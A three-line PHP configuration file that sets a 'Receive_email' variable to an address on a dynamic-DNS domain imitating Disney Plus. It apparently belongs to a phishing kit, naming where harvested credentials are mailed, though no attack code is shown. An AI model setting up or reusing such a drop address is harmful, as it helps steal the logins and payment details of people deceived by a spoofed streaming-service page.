<?php
    $Receive_email = "xb@desieneyplus.duckdns.org";
    $site_root = "";
?>